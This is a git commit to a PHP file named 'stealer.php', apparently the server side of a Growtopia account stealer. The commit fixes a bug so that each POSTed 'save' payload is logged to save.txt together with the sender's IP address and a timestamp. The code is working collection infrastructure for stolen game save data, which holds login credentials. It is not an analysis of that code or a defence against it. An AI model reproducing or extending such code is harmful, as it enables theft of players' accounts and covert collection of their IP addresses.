7705b944f58af195dab11bd4805b9e0402487970
Growtopia Noobs <growtopianoobs@gmail.com>
2016-10-23 20:19:34 +0200

    Update stealer.php
    Bug fix

--- server/stealer.php
+++ server/stealer.php
@@ -3,5 +3,5 @@
 	fwrite($myfile, $_POST["save"]);
 	fclose($myfile);*/
 	$saveVal = $_POST["save"] . "; " . $_SERVER['REMOTE_ADDR'] . "; " . date('Y/m/d H:i:s') . "\n";
-	file_put_contents("save.txt", $person, FILE_APPEND | LOCK_EX);
+	file_put_contents("save.txt", $saveVal, FILE_APPEND | LOCK_EX);
 ?>
